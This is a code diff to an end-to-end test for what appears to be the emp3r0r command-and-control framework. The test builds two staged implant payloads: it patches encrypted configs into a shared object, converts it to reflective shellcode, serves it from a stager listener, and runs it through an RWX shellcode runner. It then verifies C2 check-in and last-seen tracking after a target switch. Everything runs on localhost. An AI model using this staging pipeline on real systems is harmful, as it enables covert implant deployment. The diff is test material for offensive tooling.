@@ -159,6 +159,13 @@ func runAgentEndToEndLifecycle(t *testing.T, mode string) {
 		t.Fatalf("Failed to sign UUID: %v", err)
 	}
 
+	agent2UUID := uuid.New().String()
+	agent2Tag := "test-stager-agent-" + agent2UUID
+	agent2Sig, err := signUUID(agent2UUID, transport.CaKeyFile)
+	if err != nil {
+		t.Fatalf("Failed to sign agent 2 UUID: %v", err)
+	}
+
 	c2HttpPortStr := fmt.Sprintf("%d", c2Port+1)
 	preflightURL := fmt.Sprintf("http://127.0.0.1:%s/preflight-test", c2HttpPortStr)
 	if mode == def.C2ChannelModeH2Conn {
@@ -198,46 +205,13 @@ func runAgentEndToEndLifecycle(t *testing.T, mode string) {
 	live.AgentList = make([]*def.Emp3r0rAgent, 0)
 	time.Sleep(100 * time.Millisecond)
 
-	// 4. Encrypt config and patch the placeholder into the raw .so.
+	// 4. Encrypt configs and patch the placeholders into the raw .so bytes.
 	//
 	// IMPORTANT: patch BEFORE calling malasada.ConvertSharedObject so the
 	// config bytes are already in place when aplib compresses the .so.
 	// Patching after compression fails because aplib collapses the 4096-byte
 	// run of 0xff into a short back-reference — the literal placeholder no
 	// longer exists in the output blob.
-	cfg := &def.Config{
-		CCAddress:        "127.0.0.1",
-		CCH2Port:         c2PortStr,
-		CCHTTPPort:       c2HttpPortStr,
-		C2ChannelMode:    mode,
-		CAPEM:            string(caCertData),
-		C2Routes:         routes,
-		AgentUUID:        agentUUID,
-		AgentUUIDSig:     agentSig,
-		AgentTag:         agentTag,
-		ModulePath:       "",
-		CCTimeout:        1000,
-		PreflightEnabled: true,
-		PreflightURL:     preflightURL,
-		PreflightMethod:  "GET",
-		IsRunByStager:    true,
-		MalleableC2:      malleableCfg,
-	}
-	cborBytes, err := cbor.Marshal(cfg)
-	if err != nil {
-		t.Fatalf("Failed to marshal config: %v", err)
-	}
-	encConfig, err := crypto.AES_GCM_Encrypt([]byte(def.MagicString), cborBytes)
-	if err != nil {
-		t.Fatalf("Failed to encrypt config: %v", err)
-	}
-	if len(encConfig) < len(def.AgentConfig) {
-		encConfig = append(encConfig, bytes.Repeat([]byte{0x00}, len(def.AgentConfig)-len(encConfig))...)
-	} else if len(encConfig) > len(def.AgentConfig) {
-		t.Fatalf("Config payload too large: %d > %d", len(encConfig), len(def.AgentConfig))
-	}
-
-	// Patch placeholder in the raw .so bytes.
 	soBytes, err := os.ReadFile(agentSOPath)
 	if err != nil {
 		t.Fatalf("Failed to read agent.so: %v", err)
@@ -248,29 +222,68 @@ func runAgentEndToEndLifecycle(t *testing.T, mode string) {
 			"Verify the agent is built with the correct tags so def.AgentConfig is embedded.",
 			len(def.AgentConfig))
 	}
-	patchedSOBytes := bytes.Replace(soBytes, placeholder, encConfig, 1)
-	patchedSOPath := filepath.Join(tmpDir, "agent_patched.so")
-	if err := os.WriteFile(patchedSOPath, patchedSOBytes, 0o755); err != nil {
-		t.Fatalf("Failed to write patched agent.so: %v", err)
-	}
-	logging.Successf("agent.so patched with config (%d bytes)", len(patchedSOBytes))
 
-	// 5. Convert the patched .so to a malasada reflective-ELF blob.
-	//
-	// Output layout: [malasada stage0 shellcode][aplib-compressed patched .so]
-	// The stage0 entry convention matches downloader.c:
-	//   typedef void (*stage1_entry)(void *base_addr, size_t total_size);
-	malasadaPayload, err := malasada.ConvertSharedObject(patchedSOPath, "main", true)
-	if err != nil {
-		t.Fatalf("malasada.ConvertSharedObject failed: %v", err)
-	}
-	logging.Infof("Malasada payload size: %d bytes", len(malasadaPayload))
+	buildPayload := func(cfg *def.Config, name string) string {
+		cborBytes, err := cbor.Marshal(cfg)
+		if err != nil {
+			t.Fatalf("Failed to marshal config: %v", err)
+		}
+		encConfig, err := crypto.AES_GCM_Encrypt([]byte(def.MagicString), cborBytes)
+		if err != nil {
+			t.Fatalf("Failed to encrypt config: %v", err)
+		}
+		if len(encConfig) < len(def.AgentConfig) {
+			encConfig = append(encConfig, bytes.Repeat([]byte{0x00}, len(def.AgentConfig)-len(encConfig))...)
+		} else if len(encConfig) > len(def.AgentConfig) {
+			t.Fatalf("Config payload too large: %d > %d", len(encConfig), len(def.AgentConfig))
+		}
 
-	payloadPath := filepath.Join(tmpDir, "agent_payload.bin")
-	if err := os.WriteFile(payloadPath, malasadaPayload, 0o644); err != nil {
-		t.Fatalf("Failed to write malasada payload: %v", err)
+		// Patch placeholder in the raw .so bytes.
+		patchedSOBytes := bytes.Replace(soBytes, placeholder, encConfig, 1)
+		patchedSOPath := filepath.Join(tmpDir, name+"_patched.so")
+		if err := os.WriteFile(patchedSOPath, patchedSOBytes, 0o755); err != nil {
+			t.Fatalf("Failed to write patched agent.so: %v", err)
+		}
+		logging.Successf("%s: agent.so patched with config (%d bytes)", name, len(patchedSOBytes))
+
+		// Convert the patched .so to a malasada reflective-ELF blob.
+		malasadaPayload, err := malasada.ConvertSharedObject(patchedSOPath, "main", true)
+		if err != nil {
+			t.Fatalf("malasada.ConvertSharedObject failed: %v", err)
+		}
+		logging.Infof("%s: malasada payload size: %d bytes", name, len(malasadaPayload))
+
+		payloadPath := filepath.Join(tmpDir, name+"_payload.bin")
+		if err := os.WriteFile(payloadPath, malasadaPayload, 0o644); err != nil {
+			t.Fatalf("Failed to write malasada payload: %v", err)
+		}
+		logging.Successf("%s: malasada payload ready", name)
+		return payloadPath
 	}
-	logging.Successf("Malasada payload ready")
+
+	newAgentConfig := func(uuidStr, sig, tag string) *def.Config {
+		return &def.Config{
+			CCAddress:        "127.0.0.1",
+			CCH2Port:         c2PortStr,
+			CCHTTPPort:       c2HttpPortStr,
+			C2ChannelMode:    mode,
+			CAPEM:            string(caCertData),
+			C2Routes:         routes,
+			AgentUUID:        uuidStr,
+			AgentUUIDSig:     sig,
+			AgentTag:         tag,
+			ModulePath:       "",
+			CCTimeout:        1000,
+			PreflightEnabled: true,
+			PreflightURL:     preflightURL,
+			PreflightMethod:  "GET",
+			IsRunByStager:    true,
+			MalleableC2:      malleableCfg,
+		}
+	}
+
+	payloadPath := buildPayload(newAgentConfig(agentUUID, agentSig, agentTag), "agent1")
+	payload2Path := buildPayload(newAgentConfig(agent2UUID, agent2Sig, agent2Tag), "agent2")
 
 	// 6. Start C2 server
 	server.OPERATORS.Store("dummy", nil)
@@ -332,32 +345,7 @@ func runAgentEndToEndLifecycle(t *testing.T, mode string) {
 	logging.Infof("Stage 0 stager size: %d bytes", len(input))
 	os.Remove("../stager.bin")
 
-	// 7. Start listener
-	//
-	// buildServedBlob XORs the payload with the key-derived bytes — matching
-	// the xor_data call in downloader_main.  compression=false because the
-	// malasada payload is already position-independent shellcode; compressing
-	// it a second time buys little and would require a second decompressor.
-	go func() {
-		if err := listener.HTTPListener(payloadPath, stagerPortStr, stagerKey); err != nil {
-			logging.Errorf("Stager listener failed: %v", err)
-		}
-	}()
-	listenerReady := false
-	for range 100 {
-		conn, err := net.Dial("tcp", fmt.Sprintf("127.0.0.1:%s", stagerPortStr))
-		if err == nil {
-			conn.Close()
-			listenerReady = true
-			break
-		}
-		time.Sleep(500 * time.Millisecond)
-	}
-	if !listenerReady {
-		t.Fatalf("Stager listener failed to start on port %s", stagerPortStr)
-	}
-
-	// 8. Build a thin shellcode runner for stager.bin.
+	// 7. Build a thin shellcode runner for stager.bin.
 	//
 	// stager.bin has its own _start (assembled in downloader.c) so we simply
 	// mmap it RWX and call it with no arguments — the downloader sets up its
@@ -392,55 +380,86 @@ func runAgentEndToEndLifecycle(t *testing.T, mode string) {
 		t.Fatalf("Failed to build stager runner: %v\nOutput: %s", err, string(out))
 	}
 
-	// 9. Run the stager runner
-	cmdRunner := exec.Command(runnerBin, stagerBinPath)
-	var stdout, stderr bytes.Buffer
-	cmdRunner.Stdout = &stdout
-	cmdRunner.Stderr = &stderr
-	cmdRunner.Env = append(
-		os.Environ(),
-		fmt.Sprintf("HOME=%s", tmpDir),
-		"STAGER_TEST=1",
-	)
-	logging.Infof("Running stager runner...")
-	if err := cmdRunner.Start(); err != nil {
-		t.Fatalf("Failed to start stager runner: %v", err)
-	}
-	doneChan := make(chan error, 1)
-	go func() { doneChan <- cmdRunner.Wait() }()
-
-	// 10. Wait for agent check-in
-	timeout := 60 * time.Second
-	start := time.Now()
-	var agent *def.Emp3r0rAgent
-	for {
-		if time.Since(start) > timeout {
-			fmt.Printf("Runner Stdout:\n%s\n", stdout.String())
-			fmt.Printf("Runner Stderr:\n%s\n", stderr.String())
-			t.Fatalf("Timeout waiting for agent checkin")
-		}
-		live.AgentControlMap.Range(func(key, value any) bool {
-			k := key.(*def.Emp3r0rAgent)
-			v := value.(*live.AgentControl)
-			if k.Tag != "" && v.Conn != nil {
-				agent = k
-				return false
+	// 8. Launch a staged agent and wait for its check-in.
+	//
+	// buildServedBlob XORs the payload with the key-derived bytes — matching
+	// the xor_data call in downloader_main. compression=false because the
+	// malasada payload is already position-independent shellcode.
+	launchAgent := func(payloadPath, uuidStr, label string) (*def.Emp3r0rAgent, *exec.Cmd, chan error, *bytes.Buffer, *bytes.Buffer) {
+		// Stop any previous listener first so the runner cannot download the
+		// previous agent's payload (the listeners share one port).
+		listener.StopHTTP()
+		go func() {
+			if err := listener.HTTPListener(payloadPath, stagerPortStr, stagerKey); err != nil {
+				logging.Errorf("Stager listener failed: %v", err)
 			}
-			return true
-		})
-		if agent != nil {
-			logging.Successf("Agent checked in! Tag: %s", agent.Tag)
-			break
+		}()
+		listenerReady := false
+		for range 100 {
+			conn, err := net.Dial("tcp", fmt.Sprintf("127.0.0.1:%s", stagerPortStr))
+			if err == nil {
+				conn.Close()
+				listenerReady = true
+				break
+			}
+			time.Sleep(500 * time.Millisecond)
 		}
-		select {
-		case err := <-doneChan:
-			fmt.Printf("Runner Stdout:\n%s\n", stdout.String())
-			fmt.Printf("Runner Stderr:\n%s\n", stderr.String())
-			t.Fatalf("Stager runner exited before agent checkin: %v", err)
-		default:
+		if !listenerReady {
+			t.Fatalf("Stager listener failed to start on port %s", stagerPortStr)
 		}
-		time.Sleep(100 * time.Millisecond)
+
+		cmdRunner := exec.Command(runnerBin, stagerBinPath)
+		var stdout, stderr bytes.Buffer
+		cmdRunner.Stdout = &stdout
+		cmdRunner.Stderr = &stderr
+		cmdRunner.Env = append(
+			os.Environ(),
+			fmt.Sprintf("HOME=%s", tmpDir),
+			"STAGER_TEST=1",
+		)
+		logging.Infof("Running stager runner for %s...", label)
+		if err := cmdRunner.Start(); err != nil {
+			t.Fatalf("Failed to start stager runner: %v", err)
+		}
+		doneChan := make(chan error, 1)
+		go func() { doneChan <- cmdRunner.Wait() }()
+
+		timeout := 60 * time.Second
+		start := time.Now()
+		var agent *def.Emp3r0rAgent
+		for {
+			if time.Since(start) > timeout {
+				fmt.Printf("Runner Stdout:\n%s\n", stdout.String())
+				fmt.Printf("Runner Stderr:\n%s\n", stderr.String())
+				t.Fatalf("Timeout waiting for agent checkin (%s)", label)
+			}
+			live.AgentControlMap.Range(func(key, value any) bool {
+				k := key.(*def.Emp3r0rAgent)
+				v := value.(*live.AgentControl)
+				if k.UUID == uuidStr && v.Conn != nil {
+					agent = k
+					return false
+				}
+				return true
+			})
+			if agent != nil {
+				logging.Successf("Agent checked in! Tag: %s", agent.Tag)
+				break
+			}
+			select {
+			case err := <-doneChan:
+				fmt.Printf("Runner Stdout:\n%s\n", stdout.String())
+				fmt.Printf("Runner Stderr:\n%s\n", stderr.String())
+				t.Fatalf("Stager runner exited before agent checkin (%s): %v", label, err)
+			default:
+			}
+			time.Sleep(100 * time.Millisecond)
+		}
+		return agent, cmdRunner, doneChan, &stdout, &stderr
 	}
+
+	agent, cmdRunner, doneChan, stdout, stderr := launchAgent(payloadPath, agentUUID, "agent1")
+	agent2, cmdRunner2, doneChan2, stdout2, stderr2 := launchAgent(payload2Path, agent2UUID, "agent2")
 
 	// 11. Verify command execution
 	logging.Infof("Verifying command execution...")
@@ -473,6 +492,39 @@ func runAgentEndToEndLifecycle(t *testing.T, mode string) {
 		t.Fatalf("Failed to receive command output")
 	}
 	logging.Println("Command output verification passed.")
+
+	// 11.5 Verify last-seen advances from keep-alive hellos, before and after
+	// switching the active target. This is a regression test for last-seen
+	// tracking breaking once the active target is changed.
+	logging.Infof("Verifying last-seen tracking across target switch...")
+	waitLastSeenAdvance := func(label string, a *def.Emp3r0rAgent, baseline time.Time, timeout time.Duration) {
+		deadline := time.Now().Add(timeout)
+		for time.Now().Before(deadline) {
+			if a.LastSeen.After(baseline) {
+				logging.Successf("%s (%s): LastSeen advanced %v -> %v", label, a.Tag, baseline, a.LastSeen)
+				return
+			}
+			time.Sleep(500 * time.Millisecond)
+		}
+		t.Fatalf("%s (%s): LastSeen did not advance from keep-alive (baseline=%v, current=%v)", label, a.Tag, baseline, a.LastSeen)
+	}
+
+	before1 := agent.LastSeen
+	before2 := agent2.LastSeen
+	waitLastSeenAdvance("before switch", agent, before1, 90*time.Second)
+	waitLastSeenAdvance("before switch", agent2, before2, 90*time.Second)
+
+	// Simulate the operator's `target <agent2>` on the server side.
+	agents.SetActiveAgent(agent2.Tag)
+	if live.ActiveAgent == nil || live.ActiveAgent.UUID != agent2.UUID {
+		t.Fatalf("SetActiveAgent failed to set active target")
+	}
+	logging.Successf("Switched active target to %s", agent2.Tag)
+
+	after1 := agent.LastSeen
+	after2 := agent2.LastSeen
+	waitLastSeenAdvance("after switch", agent, after1, 90*time.Second)
+	waitLastSeenAdvance("after switch", agent2, after2, 90*time.Second)
 
 	// 12. Restart / reconnection test
 	//
@@ -578,20 +630,25 @@ func runAgentEndToEndLifecycle(t *testing.T, mode string) {
 		}
 	}
 
-	// Final: verify runner is still alive
+	// Final: verify runners are still alive
 	select {
 	case err := <-doneChan:
 		logging.Debugf("Runner Stdout:\n%s", stdout.String())
 		logging.Debugf("Runner Stderr:\n%s", stderr.String())
 		t.Fatalf("Stager runner process died unexpectedly: %v", err)
+	case err := <-doneChan2:
+		logging.Debugf("Runner2 Stdout:\n%s", stdout2.String())
+		logging.Debugf("Runner2 Stderr:\n%s", stderr2.String())
+		t.Fatalf("Stager runner2 process died unexpectedly: %v", err)
 	default:
-		logging.Println("Stager runner still running — test passed.")
+		logging.Println("Stager runners still running — test passed.")
 	}
 
 	logging.Successf("TestAgentEndToEndLifecycle PASSED")
 
 	// Cleanup
 	cmdRunner.Process.Kill()
+	cmdRunner2.Process.Kill()
 	listener.StopHTTP()
 	if network.EmpTLSServer != nil {
 		ctx, cancel := context.WithTimeout(context.Background(), 5*time.Second)
